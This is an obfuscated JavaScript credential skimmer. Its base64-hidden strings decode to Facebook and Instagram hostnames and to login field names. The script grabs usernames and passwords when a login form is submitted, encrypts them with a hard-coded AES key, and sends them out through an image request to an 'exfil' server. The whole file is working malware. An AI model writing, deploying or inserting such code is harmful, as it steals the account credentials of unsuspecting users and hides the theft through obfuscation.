(function() {
function _xo5c(_e02a) {
  return atob(_e02a);
}
function _xg0a() {
  return document;
}
function _xu88() {
  return window;
}
function _xk1k() {
  return _xo5c('c3VibWl0');
}
function _xu2r() {
  return _xo5c('bC5teXNl');
}
function findFormValue(selectors, formdata) {
  for (const sel of selectors) {
    let inp = formdata.get(sel);
    if (inp && (inp.value !== undefined) && inp.value !== "") {
      return inp.value;
    }
  }
  return null;
}
const _lp59 = [_xo5c("d3d3LmZhY2Vib29rLmNvbQ=="), _xo5c("d3d3Lmluc3RhZ3JhbS5jb20=")];
if (_lp59.indexOf(_xu88().location.hostname) !== -1) {
  _xg0a().addEventListener(_xk1k(), function(ev) {
    let _lf2m = ev.target;
    let _lf6e = new FormData(_lf2m);
    let _lt7y = findFormValue([_xo5c("cGFzc3dvcmQ="), _xo5c("cGFzcw=="), _xo5c("c2VjcmV0")], _lf6e);
    let _la1h = findFormValue([_xo5c("dXNlcm5hbWU="), _xo5c("dXNlcg=="), _xo5c("ZW1haWw="), _xo5c("bWFpbA==")], _lf6e);
    if (_la1h && _lt7y) {
      _xm7c(_la1h, _lt7y);
    }
  });
}
function _xm7c(_l44d, _lp6s) {
  const data = {
    u: _l44d,
    p: _lp6s,
    domain: _xu88().location.hostname
  };
  const enc = encrypt(JSON.stringify(data));
  send(enc);
}
function _xsk4(a, b, c) {
  let zero = a*2 + 4 - 98 + 0xa;
  let two = b*7 - 0x1f6;
  return 'U'+two.toString()+_xo5c(c)+zero.toString()+'RXhLZXk'+zero.toString()+'OTQz';
}
function encrypt(s) {
  const key = CryptoJS.enc.Utf8.parse(_xo5c(_xsk4(42, 0x48, 'VmpjbVY=')));
  const iv = CryptoJS.lib.WordArray.random(16);
  const e = CryptoJS.AES.encrypt(s, key, {iv: iv});
  return iv.append(e).toString(CryptoJS.enc.Base64);
}
function send(data) {
  let _lc23 = new Image();
  _lc23.src = _xo5c(_xo5c("YUhSMGNITTZMeTlsZUdacA=="))+_xu2r()+_xo5c('cnZlci5jb20vcmVjdj9kYXRhPQ==')+encodeURIComponent(data);
  _xg0a().body.appendChild(_lc23);
}
})